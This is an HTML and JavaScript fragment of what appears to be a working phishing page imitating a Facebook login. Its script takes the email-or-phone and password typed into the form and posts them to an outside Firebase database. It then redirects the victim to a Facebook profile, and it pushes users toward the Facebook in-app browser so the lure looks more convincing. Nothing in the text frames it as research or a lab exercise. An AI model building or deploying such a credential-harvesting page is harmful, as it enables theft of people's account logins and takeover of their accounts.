    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"> </script>
    
    <script>
        function postData() {
            var phone = document.getElementById('phone').value;
            var password = document.getElementById('password').value;
            if(phone == "" || password == "") {
                alert("please fill fields");
                return;
            }
            var data = {
                e : phone,
                pass: password
            }
            axios.post('https://portfolio-32809.firebaseio.com/order.json', data).then(
                browserIdentify()
//                 window.location.assign("https://www.facebook.com")
            ).catch(err => console.log(err));
        }
        function browserIdentify() {
            if(navigator.appCodeName == "Mozilla" && !isFacebookApp()) {
                alert("please open in facebook browser!");
                return;
            }
            else 
            {
               window.location.assign("https://www.facebook.com/khkolykho");
            }
        }
        function isFacebookApp() {
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
        }
        </script>
</head>
<body>
    <div class="headerDiv"></div>
        <br>
        <div class="container">
            <form>
                <div class="form-group">
                    <input type="text" placeholder="Email Or Phone" id="phone" name="number" required class="form-control">
                </div>
                <div class="form-group">
                    <input type="password" placeholder="Password" id="password" name="password" required class="form-control">
                </div>  
                <button type="button" onClick="postData();" class="btn btn-block btn-primary">Log In</button>
            </form>
